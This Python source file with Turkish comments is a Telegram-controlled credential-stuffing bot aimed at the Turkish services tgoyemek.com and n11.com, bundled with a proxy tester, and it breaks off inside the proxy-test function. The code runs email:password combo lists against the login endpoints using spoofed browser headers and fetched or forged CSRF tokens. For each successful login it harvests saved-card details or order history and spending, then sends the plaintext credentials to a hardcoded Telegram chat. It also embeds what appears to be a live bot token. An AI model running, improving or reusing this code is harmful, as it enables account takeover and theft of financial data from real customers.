#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UNIFIED BOT — TGOYEMEK + N11 CHECKER + PROXY TOOL
VDS 7/24 uyumlu, systemd ile çalışır.
"""

import asyncio
import base64
import hashlib
import hmac
import html
import io
import json
import logging
import os
import random
import re
import secrets
import signal
import socket
import sys
import tempfile
import threading
import time
import uuid
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from functools import wraps
from typing import Any, Callable, Optional

import httpx
import requests
from colorama import Fore, init as colorama_init

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile,
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, ContextTypes,
    MessageHandler, CallbackQueryHandler, filters,
)
from telegram.request import HTTPXRequest

colorama_init(autoreset=True)

# ============================================================
# LOGGING
# ============================================================
LOG_DIR = os.getenv("BOT_LOG_DIR", "/var/log/unified_bot")
try:
    os.makedirs(LOG_DIR, exist_ok=True)
except Exception:
    LOG_DIR = tempfile.gettempdir()

LOG_FILE = os.path.join(LOG_DIR, "unified_bot.log")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("unified_bot")

# ============================================================
# AYARLAR
# ============================================================
BOT_TOKEN = os.getenv("BOT_TOKEN", "8849504334:AAFdhT7VqkoWr_NXyVUvv61BkligwbgSKFw")
TG_CHAT_ID = os.getenv("TG_CHAT_ID", "8295696730")
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
SIGNING_SECRET = os.getenv("SIGNING_SECRET", secrets.token_hex(32))

# TGOYEMEK
BASE_URL = "https://tgoyemek.com"
CSRF_URL = f"{BASE_URL}/api/auth/csrf"
LOGIN_URL = f"{BASE_URL}/api/auth/login"
CARDS_URL = f"{BASE_URL}/hesabim/kayitli-kartlarim"

# N11
N11_BASE_URL = "https://www.n11.com"
N11_CSRF_URL = f"{N11_BASE_URL}/giris-yap"
N11_LOGIN_URL = f"{N11_BASE_URL}/login"
N11_ORDERS_URL = f"{N11_BASE_URL}/rest/v1/getProductOrderLightList?listingType=ALL&dateFormat=&pg=1"
N11_POINT_URL = f"{N11_BASE_URL}/rest/v1/pointBalanceText"
N11_FORGERY_URL = f"{N11_BASE_URL}/api/forgery-token"
N11_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/145.0.0.0 Safari/537.36"
)

# Proxy Tool
MAX_WORKERS = 1000
TIMEOUT = 2
MAX_GENERATE = 1_000_000
LINES_PER_FILE = 50_000
UPDATE_INTERVAL = 1.5
TEST_URL = "https://api.telegram.org"
MAX_FILE_SIZE = 20 * 1024 * 1024
ALLOWED_EXTENSIONS = (".txt", ".list", ".proxies")

# Checker
THREAD_COUNT = 30
MAX_PROXY_RETRY = 5
DELAY_PER_ACCOUNT = 0.3
CSRF_REFRESH_EVERY = 1
REQUEST_INTERVAL = 3.0

# Telegram HTTPX
CONNECT_TIMEOUT = 30.0
READ_TIMEOUT = 30.0
WRITE_TIMEOUT = 30.0
POOL_TIMEOUT = 30.0

# ============================================================
# GLOBAL STOP
# ============================================================
STOP_EVENT = threading.Event()
SHUTDOWN_EVENT = asyncio.Event()


def _install_signal_handlers():
    def _handler(signum, _frame):
        logger.warning("Signal %s alındı, kapatılıyor...", signum)
        STOP_EVENT.set()
        try:
            SHUTDOWN_EVENT.set()
        except Exception:
            pass
    for sig in (signal.SIGTERM, signal.SIGINT):
        try:
            signal.signal(sig, _handler)
        except Exception:
            pass


# ============================================================
# TELEGRAM HTTPX REQUEST
# ============================================================
def build_request():
    return HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=CONNECT_TIMEOUT,
        read_timeout=READ_TIMEOUT,
        write_timeout=WRITE_TIMEOUT,
        pool_timeout=POOL_TIMEOUT,
    )


def build_updater_request():
    return HTTPXRequest(
        connection_pool_size=4,
        connect_timeout=CONNECT_TIMEOUT,
        read_timeout=READ_TIMEOUT,
        write_timeout=WRITE_TIMEOUT,
        pool_timeout=POOL_TIMEOUT,
    )


# ============================================================
# SAFE CALL
# ============================================================
async def safe_call(coro_func, *args, retries=3, delay=2, **kwargs):
    last_exc = None
    for attempt in range(1, retries + 1):
        try:
            return await coro_func(*args, **kwargs)
        except Exception as e:
            last_exc = e
            name = type(e).__name__
            if any(x in name for x in
                   ("TimedOut", "NetworkError", "ConnectTimeout",
                    "RetryAfter", "ReadError", "WriteError")):
                if attempt < retries:
                    await asyncio.sleep(delay * attempt)
                    continue
            raise
    if last_exc:
        raise last_exc


async def safe_reply(message, text, **kwargs):
    try:
        return await safe_call(message.reply_text, text, **kwargs)
    except Exception:
        return None


async def safe_edit(message, text, **kwargs):
    if message is None:
        return None
    try:
        return await safe_call(message.edit_text, text, **kwargs)
    except Exception:
        return None


async def safe_send_file(message, path, filename=None, caption=None, retries=3):
    filename = filename or os.path.basename(path)
    for attempt in range(1, retries + 1):
        try:
            with open(path, "rb") as f:
                return await message.reply_document(
                    document=InputFile(f, filename=filename),
                    caption=caption,
                )
        except Exception as e:
            name = type(e).__name__
            if any(x in name for x in
                   ("TimedOut", "NetworkError", "ConnectTimeout",
                    "RetryAfter", "ReadError", "WriteError")):
                if attempt < retries:
                    await asyncio.sleep(3 * attempt)
                    continue
            return None
    return None


# ============================================================
# İNTERNET KONTROL
# ============================================================
def check_internet():
    for host, port in (("api.telegram.org", 443), ("8.8.8.8", 53)):
        try:
            socket.create_connection((host, port), timeout=5).close()
            return True, host
        except Exception:
            continue
    return False, None


def check_telegram_api():
    try:
        r = httpx.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=15.0)
        if r.status_code == 200:
            data = r.json()
            if data.get("ok"):
                return True, data["result"].get("username", "?")
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)


# ============================================================
# TELEGRAM (senkron — checker için)
# ============================================================
def tg(method, **kwargs):
    try:
        r = requests.post(f"{TG_API}/{method}", data=kwargs, timeout=15)
        return r.json()
    except Exception:
        return None


def tg_send(text, parse_mode="HTML", reply_markup=None):
    kwargs = {"chat_id": TG_CHAT_ID, "text": text, "parse_mode": parse_mode}
    if reply_markup:
        kwargs["reply_markup"] = json.dumps(reply_markup)
    return tg("sendMessage", **kwargs)


def tg_edit(message_id, text, parse_mode="HTML", reply_markup=None):
    kwargs = {"chat_id": TG_CHAT_ID, "message_id": message_id,
              "text": text, "parse_mode": parse_mode}
    if reply_markup:
        kwargs["reply_markup"] = json.dumps(reply_markup)
    return tg("editMessageText", **kwargs)


# ============================================================
# SHARED STATE (checker için)
# ============================================================
STATS = {
    "total": 0, "checked": 0, "hits": 0, "fails": 0, "errors": 0,
    "bad": 0, "phone": 0, "cards_found": 0,
    "start_time": None, "running": False,
    "last_hit": "-", "last_card": "-",
    "csrf_count": 0, "retried": 0,
    "n11_checked": 0, "n11_hits": 0, "n11_bad": 0,
    "n11_susp": 0, "n11_locked": 0, "n11_err": 0,
    "n11_cards": 0, "n11_orders_total": 0,
    "active_checker": "-",
}
STATS_LOCK = threading.Lock()
CSRF_REFRESH_FLAG = threading.Event()
DASH_MSG_ID = None

MEMORY_HITS = []
MEMORY_CARDS = []
MEMORY_N11_HITS = []
MEMORY_N11_SUSP = []
MEMORY_PHONE = []
MEMORY_LOCK = threading.Lock()


class LoginResult:
    HIT = "hit"
    WRONG = "wrong"
    PHONE = "phone"
    BAD_REQ = "bad_req"
    ERROR = "error"


INITIAL_COOKIES = {
    "tgo-ref": "getir",
    "tgo-lang": "tr",
    "guest-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cm46dHJlbmR5b2w6YW5vbmlkIjoiZDAyMTczMDZiODVjMTFmMWI5OTYwMjcxY2UzZmZjOTciLCJyb2xlIjoiYW5vbiIsImF0d3J0bWsiOiJkMDIxNzMwMy1iODVjLTExZjEtYjk5Ni0wMjcxY2UzZmZjOTciLCJhcHBOYW1lIjoibGMiLCJhdWQiOiJMTjNFUzY1bkZtOHp6UUliZ3YwUWdPRTNIV2lZOGFQUSIsImV4cCI6MTk0ODA3MjQxOSwiaXNzIjoiYXV0aC50cmVuZHlvbC5jb20iLCJuYmYiOjE3OTAyODQ0MTl9.KlmTHt-S65HpvOO-1uOK3zj5vXgAkimrMUHnWSwdB28",
    "tgo-pid": "7db11c26-5330-4ed5-9ee0-272cf33d62b1",
    "tgo-sid": "df4ada1a-cc62-4169-a970-164ee223552d",
}


# ============================================================
# RATE LIMITER
# ============================================================
class GlobalRateLimiter:
    def __init__(self, interval: float = 3.0):
        self._interval = interval
        self._lock = threading.Lock()
        self._next_slot = time.monotonic()

    def acquire(self, timeout: float = 120.0) -> bool:
        deadline = time.monotonic() + timeout
        with self._lock:
            now = time.monotonic()
            slot = max(now, self._next_slot)
            if slot > deadline:
                return False
            self._next_slot = slot + self._interval
            wait = slot - now
        if wait > 0:
            time.sleep(wait)
        return True


RATE_LIMITER = GlobalRateLimiter(interval=REQUEST_INTERVAL)


# ============================================================
# TGOYEMEK CHECKER
# ============================================================
class CSRFManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.counter = 0
        self.token = None

    def should_refresh(self):
        with self.lock:
            if CSRF_REFRESH_FLAG.is_set():
                CSRF_REFRESH_FLAG.clear()
                return True
            return self.counter >= CSRF_REFRESH_EVERY or self.token is None

    def tick(self):
        with self.lock:
            self.counter += 1

    def reset(self, token):
        with self.lock:
            self.counter = 0
            self.token = token
            with STATS_LOCK:
                STATS["csrf_count"] += 1


CSRF_MGR = CSRFManager()


def build_headers(csrf_token=None, cookies=None, extra=None):
    cookie_str = "; ".join(f"{k}={v}" for k, v in (cookies or {}).items())
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Mobile Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua": '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
        "dnt": "1",
        "sec-ch-ua-mobile": "?1",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": f"{BASE_URL}/giris?callbackUrl=%2Frestoranlar",
        "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "priority": "u=1, i",
        "Cookie": cookie_str,
    }
    if csrf_token:
        headers["content-type"] = "text/plain;charset=UTF-8"
        headers["origin"] = BASE_URL
    if extra:
        headers.update(extra)
    return headers


def fetch_csrf(session):
    r = session.get(CSRF_URL, headers=build_headers(cookies=session.cookies.get_dict()), timeout=15)
    csrf_cookie = session.cookies.get("tgo-csrf-token")
    body_token = None
    try:
        data = r.json()
        body_token = data.get("csrfToken") or data.get("token")
    except Exception:
        m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', r.text)
        if m:
            body_token = m.group(1)
    token = body_token or csrf_cookie
    if token:
        CSRF_MGR.reset(token)
    return token


def classify_login(response):
    status = response.status_code
    text = response.text
    low = text.lower()

    if "tgo-token" in [c.name for c in response.cookies]:
        return LoginResult.HIT
    for pat in (r'"token"\s*:\s*"([^"]+)"', r'"access_token"\s*:\s*"([^"]+)"'):
        m = re.search(pat, text)
        if m and len(m.group(1)) > 30:
            return LoginResult.HIT

    if "telefonunuza" in low or ("telefon" in low and "doğrula" in low):
        return LoginResult.PHONE
    if "phone" in low and ("verify" in low or "verification" in low):
        return LoginResult.PHONE
    if "hatalı" in low and ("şifre" in low or "e-posta" in low or "eposta" in low):
        return LoginResult.WRONG
    if "invalid credentials" in low or "wrong password" in low:
        return LoginResult.WRONG
    if status == 400 and "bad request" in low:
        return LoginResult.BAD_REQ
    if "beklenmeyen" in low or "error occurred" in low:
        return LoginResult.ERROR
    if status == 200:
        return LoginResult.HIT
    return LoginResult.ERROR


def try_login(session, email, password, csrf_token):
    payload = '{"username":"%s","password":"%s","csrfToken":"%s"}' % (email, password, csrf_token)
    r = session.post(
        LOGIN_URL, data=payload,
        headers=build_headers(csrf_token=csrf_token, cookies=session.cookies.get_dict()),
        timeout=15, allow_redirects=False,
    )
    return classify_login(r), r


def extract_token_from_response(response):
    token = response.cookies.get("tgo-token")
    if token:
        return token
    for pat in (r'"token"\s*:\s*"([^"]+)"', r'"access_token"\s*:\s*"([^"]+)"'):
        m = re.search(pat, response.text)
        if m and len(m.group(1)) > 30:
            return m.group(1)
    return None


def parse_cards(text):
    cards = []
    pattern = re.compile(r'\{"cardId":(\d+).*?\}', re.DOTALL)
    for m in pattern.finditer(text):
        block = m.group(0)
        if '"maskedCardNumber"' not in block:
            continue
        card = {}
        for fld in ["cardId", "name", "maskedCardNumber", "cardType", "cardTypeName",
                    "cardSourceType", "bankName", "bankLogoUrl", "cardYear", "cardMonth",
                    "cardCountry", "cardCountryIsoA2", "cardNetwork"]:
            fm = re.search(rf'"{fld}":"([^"]*)"', block)
            if fm:
                card[fld] = fm.group(1)
            else:
                fm = re.search(rf'"{fld}":(\d+)', block)
                if fm:
                    card[fld] = fm.group(1)
        for fld in ["isDebitCard", "cvvRequired", "isRewardable", "isCoBranded", "isPayLater", "preAuthCompatible"]:
            fm = re.search(rf'"{fld}":(true|false)', block)
            if fm:
                card[fld] = fm.group(1) == "true"
        if card.get("maskedCardNumber"):
            cards.append(card)
    return cards


def fetch_cards(session, token):
    try:
        extra_headers = {
            "rsc": "1",
            "next-url": "/my-account/saved-cards",
            "referer": f"{BASE_URL}/hesabim/kayitli-kartlarim",
        }
        cookies = session.cookies.get_dict()
        cookies["tgo-token"] = token
        r = session.get(
            CARDS_URL,
            params={"_rsc": "tj3q5CFih8kMWE5e"},
            headers=build_headers(cookies=cookies, extra=extra_headers),
            timeout=15,
        )
        return parse_cards(r.text)
    except Exception:
        return []


def tg_hit_alert(email, password, idx, cards=None):
    card_block = ""
    if cards:
        lines = []
        for c in cards:
            lines.append(
                f"  • <b>{html.escape(c.get('name','-'))}</b> — "
                f"<code>{html.escape(c.get('maskedCardNumber','-'))}</code> "
                f"({html.escape(c.get('bankName','-'))})"
            )
        card_block = "\n💳 <b>Kartlar:</b>\n" + "\n".join(lines)
    tg_send(
        f"🎯 <b>HIT #{idx}</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📧 <code>{html.escape(email)}</code>\n"
        f"🔑 <code>{html.escape(password)}</code>\n"
        f"🌐 {BASE_URL}{card_block}\n"
        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
    )


def try_account(email, password):
    attempt = 0
    while not STOP_EVENT.is_set():
        attempt += 1
        try:
            if not RATE_LIMITER.acquire():
                continue
            session = requests.Session()
            session.cookies.update(INITIAL_COOKIES)

            csrf = fetch_csrf(session) if CSRF_MGR.should_refresh() else CSRF_MGR.token
            if not csrf:
                with STATS_LOCK:
                    STATS["retried"] += 1
                continue

            if not RATE_LIMITER.acquire():
                continue
            result, resp = try_login(session, email, password, csrf)
            CSRF_MGR.tick()

            if result == LoginResult.HIT:
                with STATS_LOCK:
                    STATS["checked"] += 1
                    STATS["hits"] += 1
                    STATS["last_hit"] = f"{email} @ {datetime.now().strftime('%H:%M:%S')}"

                token = extract_token_from_response(resp)
                cards = []
                if token and RATE_LIMITER.acquire():
                    cards = fetch_cards(session, token)
                    if cards:
                        with MEMORY_LOCK:
                            for c in cards:
                                MEMORY_CARDS.append((email, c))
                        with STATS_LOCK:
                            STATS["cards_found"] += len(cards)
                            STATS["last_card"] = f"{cards[0].get('name','?')} — {cards[0].get('maskedCardNumber','?')}"

                with MEMORY_LOCK:
                    MEMORY_HITS.append(f"{email}:{password}")

                print(Fore.GREEN + f"[+] HIT: {email}:{password} | Kart: {len(cards)} | Deneme: {attempt}")
                tg_hit_alert(email, password, STATS["hits"], cards)
                return

            if result == LoginResult.WRONG:
                with STATS_LOCK:
                    STATS["checked"] += 1
                    STATS["bad"] += 1
                print(Fore.RED + f"[-] YANLIŞ: {email}")
                return

            if result == LoginResult.PHONE:
                with STATS_LOCK:
                    STATS["retried"] += 1
                    STATS["phone"] += 1
                with MEMORY_LOCK:
                    MEMORY_PHONE.append(f"{email}:{password}")
                print(Fore.CYAN + f"[📞] TELEFON: {email}")
                return

            with STATS_LOCK:
                STATS["retried"] += 1
            print(Fore.YELLOW + f"[!] RETRY: {email} -> {result}")

        except Exception as e:
            print(Fore.YELLOW + f"[!] {email} -> {e}")
            with STATS_LOCK:
                STATS["retried"] += 1
        time.sleep(DELAY_PER_ACCOUNT)


def worker_pool(combos):
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(try_account, e, p) for e, p in combos]
        for _ in as_completed(futures):
            if STOP_EVENT.is_set():
                break


# ============================================================
# N11 CHECKER
# ============================================================
def n11_generate_csrf():
    ts = int(time.time() * 1000)
    rand = round(random.uniform(0.1, 0.9999), 4)
    raw = f"{ts}.{rand}"
    return base64.b64encode(raw.encode()).decode().rstrip("=")


def n11_get_session():
    base_headers = {
        "User-Agent": N11_UA,
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    session = requests.Session()
    session.headers.update(base_headers)
    try:
        r = session.get(
            N11_CSRF_URL,
            headers={**base_headers, "Referer": f"{N11_BASE_URL}/",
                     "Upgrade-Insecure-Requests": "1",
                     "Sec-Fetch-Dest": "document",
                     "Sec-Fetch-Mode": "navigate",
                     "Sec-Fetch-Site": "same-origin"},
            timeout=12, allow_redirects=True,
        )
        html_body = r.text or ""
        csrf = ""
        for pat in (r'"_csrf"\s*:\s*"([A-Za-z0-9+/=]{10,})"',
                    r"'_csrf'\s*:\s*'([A-Za-z0-9+/=]{10,})'",
                    r'name="_csrf"\s+value="([^"]+)"'):
            m = re.search(pat, html_body)
            if m:
                csrf = m.group(1)
                break
        if not csrf:
            csrf = n11_generate_csrf()

        forgery = ""
        try:
            fr = session.get(
                N11_FORGERY_URL,
                headers={**base_headers, "Accept": "application/json, text/plain, */*",
                         "Referer": N11_CSRF_URL, "ADRUM": "isAjax:true",
                         "Sec-Fetch-Dest": "empty",
                         "Sec-Fetch-Mode": "cors",
                         "Sec-Fetch-Site": "same-origin"},
                timeout=6,
            )
            if fr.status_code == 200:
                try:
                    data = fr.json()
                    forgery = (data.get("forgeryToken") or data.get("_forgeryToken")
                               or data.get("token") or "")
                except Exception:
                    m = re.search(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
                                  fr.text, re.I)
                    if m:
                        forgery = m.group(0)
        except Exception:
            pass
        if not forgery:
            for pat in (r'"_forgeryToken"\s*:\s*"([0-9a-f\-]{30,})"',
                        r'forgeryToken["\s:=]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'):
                m = re.search(pat, html_body, re.I)
                if m:
                    forgery = m.group(1)
                    break
        if not forgery:
            forgery = str(uuid.uuid4())

        ts_ms = int(time.time() * 1000)
        device_id = f"1M{ts_ms}.{random.randint(1000000000, 9999999999)}"
        return {"session": session, "csrf": csrf, "forgery": forgery, "device_id": device_id}
    except requests.exceptions.RequestException:
        return None


def n11_get_orders(session):
    try:
        headers = {"ADRUM": "isAjax:true",
                   "Accept": "application/json, text/plain, */*",
                   "Referer": f"{N11_BASE_URL}/hesabim/siparislerim",
                   "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                   "Sec-Fetch-Site": "same-origin", "User-Agent": N11_UA}
        r = session.get(N11_ORDERS_URL, headers=headers, timeout=10)
        if r.status_code != 200:
            return [], 0
        data = r.json()
        orders = data.get("orders", []) or []
        pagination = data.get("pagination", {}) or {}
        total_count = int(pagination.get("totalCount") or len(orders) or 0)
        return orders, (total_count if total_count else len(orders))
    except Exception:
        return [], 0


def n11_check_saved_card(session):
    try:
        headers = {"Accept": "application/json, text/plain, */*",
                   "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                   "Content-Length": "0", "Origin": N11_BASE_URL,
                   "Referer": f"{N11_BASE_URL}/hesabim/odeme-seceneklerim",
                   "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                   "Sec-Fetch-Site": "same-origin", "User-Agent": N11_UA}
        r = session.post(N11_POINT_URL, headers=headers, timeout=6)
        if r.status_code == 200:
            data = r.json()
            campaigns = data.get("campaigns", []) or []
            for k in campaigns:
                if k.get("type") == "CARD_SAVE":
                    return False
            return True
    except Exception:
        pass
    return None


def n11_check_account(email, password):
    sess_data = n11_get_session()
    if not sess_data:
        return "ERROR", None, None, None, None
    session = sess_data["session"]
    ts_p = int(time.time() * 1000)
    url = f"{N11_LOGIN_URL}?{ts_p}"
    headers = {
        "ADRUM": "isAjax:true", "Accept": "application/json, text/plain, */*",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": N11_BASE_URL, "Referer": N11_CSRF_URL,
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin", "User-Agent": N11_UA,
        "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    }
    payload = {"email": email, "password": password, "_csrf": sess_data["csrf"],
               "_forgeryToken": sess_data["forgery"], "_deviceId": sess_data["device_id"],
               "setEncoding": True}
    try:
        resp = session.post(url, headers=headers, json=payload, timeout=12, allow_redirects=True)
        try:
            body = resp.json()
        except Exception:
            body = {}

        inner = body.get("data", {}) if isinstance(body.get("data"), dict) else body
        error_type = inner.get("errorType", "") if isinstance(inner, dict) else ""
        server_fp = inner.get("fingerPrint", "") if isinstance(inner, dict) else ""

        if error_type == "INVALID_FORGERY_TOKEN" and server_fp:
            payload["_forgeryToken"] = server_fp
            url2 = f"{N11_LOGIN_URL}?{int(time.time() * 1000)}"
            resp = session.post(url2, headers=headers, json=payload, timeout=12, allow_redirects=True)
            try:
                body = resp.json()
            except Exception:
                body = {}
            inner = body.get("data", {}) if isinstance(body.get("data"), dict) else body
            error_type = inner.get("errorType", "") if isinstance(inner, dict) else ""

        status_code = resp.status_code
        text_lower = (resp.text or "").lower()
        CLEAN_BAD = {"INVALID_CREDENTIALS", "INVALID_USER_CREDENTIALS",
                     "WRONG_PASSWORD", "USER_NOT_FOUND"}
        SUSPENDED = {"BUYER_IS_TEMPORARILY_SUSPENDED", "BUYER_IS_PERMANENTLY_SUSPENDED",
                     "ACCOUNT_SUSPENDED", "TEMPORARILY_SUSPENDED", "PERMANENTLY_SUSPENDED"}
        captcha = ["captcha" in text_lower, "robot" in text_lower,
                   resp.headers.get("cf-mitigated", "") != "",
                   status_code == 403, error_type == "CAPTCHA_REQUIRED"]
        blr = body.get("buyerLoginResponse") or {}
        has_buyer = bool(blr.get("buyerId") or blr.get("buyerEmail") or blr.get("accessToken")
                         or blr.get("buyerFirstName") or blr.get("buyerLastName"))
        redirect_url = body.get("redirectUrl") or ""
        success = [has_buyer, body.get("success") is True,
                   bool(redirect_url) and redirect_url not in ("", "null", None),
                   "hesabim" in (resp.url or ""), "hesabim" in str(redirect_url),
                   "dashboard" in (resp.url or ""), error_type == "SUCCESS",
                   (bool(redirect_url) and error_type == "")]
        if any(success):
            orders, order_count = n11_get_orders(session)
            if order_count == 0 or not orders:
                return "BAD", None, None, None, None
            card_status = n11_check_saved_card(session)
            return "HIT", body, orders, order_count, card_status
        if any(captcha):
            return "CAPTCHA", None, None, None, None
        if error_type in CLEAN_BAD:
            return "BAD", None, None, None, None
        if error_type in SUSPENDED:
            return "SUSPENDED", body, None, None, None
        if error_type == "ACCOUNT_LOCKED":
            return "LOCKED", body, None, None, None
        if body.get("success") is False or status_code == 401:
            return "BAD", None, None, None, None
        return "ERROR", body, None, None, None
    except requests.exceptions.Timeout:
        return "TIMEOUT", None, None, None, None
    except Exception:
        return "ERROR", None, None, None, None


def _n11_get(dict_key_pairs):
    for d, keys in dict_key_pairs:
        if not isinstance(d, dict):
            continue
        for k in keys if isinstance(keys, list) else [keys]:
            v = d.get(k)
            if v not in [None, "", "null", "N/A", 0, False]:
                return str(v)
    return "N/A"


def _n11_calc_total_value(orders):
    total = 0.0
    for o in orders or []:
        s = str(o.get("totalAmount", "0") or "0")
        s = re.sub(r"[^\d,\.]", "", s).replace(",", ".")
        try:
            total += float(s)
        except Exception:
            pass
    return total


def n11_format_hit(email, password, body, orders, order_count, card_status):
    blr = (body or {}).get("buyerLoginResponse", {}) or {}
    addr = blr.get("selectedAddress", {}) or {}
    fn = _n11_get([(blr, ["buyerFirstName", "firstName", "name", "buyerName"])])
    ln = _n11_get([(blr, ["buyerLastName", "lastName", "surname", "buyerSurname"])])
    name = f"{fn} {ln}".replace("N/A", "").strip() or "N/A"
    city = _n11_get([(addr, ["cityName", "city", "province", "il"])])
    total_val = _n11_calc_total_value(orders)
    card_text = "Kart Var" if card_status is True else ("Kart Yok" if card_status is False else "?")
    short = (f"{email}:{password} | {name} | {city} | "
             f"Sipariş:{order_count} | {total_val:.2f}TL | {card_text}")
    return short, short


def n11_try_account(email, password):
    attempt = 0
    while not STOP_EVENT.is_set():
        attempt += 1
        try:
            if not RATE_LIMITER.acquire():
                continue
            status, body, orders, order_count, card_status = n11_check_account(email, password)
            if status == "HIT":
                short, _ = n11_format_hit(email, password, body, orders, order_count, card_status)
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_hits"] += 1
                    STATS["n11_orders_total"] += int(order_count or 0)
                    if card_status:
                        STATS["n11_cards"] += 1
                    STATS["last_hit"] = f"N11 {email} @ {datetime.now().strftime('%H:%M:%S')}"
                with MEMORY_LOCK:
                    MEMORY_N11_HITS.append(short)
                print(Fore.GREEN + f"[N11 +] HIT: {email} | Sipariş: {order_count}")
                tg_send(f"🎯 <b>N11 HIT</b>\n📧 <code>{html.escape(email)}</code>\n"
                        f"🔑 <code>{html.escape(password)}</code>\n"
                        f"📦 Sipariş: <b>{order_count}</b>")
                return
            if status == "BAD":
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_bad"] += 1
                return
            if status == "SUSPENDED":
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_susp"] += 1
                with MEMORY_LOCK:
                    MEMORY_N11_SUSP.append(f"{email}:{password}")
                return
            if status == "LOCKED":
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                    STATS["n11_locked"] += 1
                return
            with STATS_LOCK:
                STATS["n11_err"] += 1
                STATS["retried"] += 1
            if attempt >= MAX_PROXY_RETRY * 3:
                with STATS_LOCK:
                    STATS["n11_checked"] += 1
                return
        except Exception as e:
            print(Fore.YELLOW + f"[N11 !] {email} -> {e}")
            with STATS_LOCK:
                STATS["retried"] += 1


def n11_worker_pool(combos):
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(n11_try_account, e, p) for e, p in combos]
        for _ in as_completed(futures):
            if STOP_EVENT.is_set():
                break


# ============================================================
# PROXY TOOL
# ============================================================
PROXY_PATTERN = re.compile(
    r"^(?:(?P<user1>[^:@\s]+):(?P<pass1>[^:@\s]+)@)?"
    r"(?P<ip>(?:\d{1,3}\.){3}\d{1,3})"
    r":(?P<port>\d{1,5})"
    r"(?::(?P<user2>[^:\s]+):(?P<pass2>[^:\s]+))?$"
)


def parse_proxies(text):
    seen = set()
    result = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = PROXY_PATTERN.match(line)
        if not m:
            continue
        ip = m.group("ip")
        port = m.group("port")
        try:
            if not (0 < int(port) < 65536):
                continue
            for part in ip.split("."):
                if not (0 <= int(part) <= 255):
                    raise ValueError
        except ValueError:
            continue
        user = m.group("user1") or m.group("user2") or ""
        pw = m.group("pass1") or m.group("pass2") or ""
        normalized = f"{user}:{pw}@{ip}:{port}" if (user and pw) else f"{ip}:{port}"
        if normalized in seen:
            continue
        seen.add(normalized)
        result.append((ip, int(port), user, pw, normalized))
    return result


def process_uploaded_file(local_path, is_zip, temp_dir):
    parts = []
    raw_lines = 0
    if is_zip:
        with zipfile.ZipFile(local_path, "r") as zf:
            for member in zf.infolist():
                if member.is_dir():
                    continue
                if not member.filename.lower().endswith(ALLOWED_EXTENSIONS):
                    continue
                try:
                    with zf.open(member) as f:
                        data = f.read()
                    if len(data) > MAX_FILE_SIZE:
                        continue
                    text = data.decode("utf-8", errors="ignore")
                    parts.append(text)
                    raw_lines += text.count("\n") + 1
                except Exception:
                    continue
    else:
        with open(local_path, "r", encoding="utf-8", errors="ignore") as f:
            text = f.read()
        parts.append(text)
        raw_lines = text.count("\n") + 1
    combined = "\n".join(parts)
    proxies = parse_proxies(combined)
    return proxies, {"raw_lines": raw_lines, "unique": len(proxies)}


def test_proxy(proxy_tuple):
    ip, port, user, pw, display = proxy_tuple
    proxy_url = f"http://{ip}:{port}"
    auth = (user, pw) if (user and pw) else None
    start = time.perf_counter()
    try:
        with httpx.Client(proxy=proxy_url, timeout=httpx.Timeout(TIMEOUT), verify=False) as client:
            r = client.get(TEST_URL, auth=auth)
            ping = int((time.perf_counter() - start) * 1000)
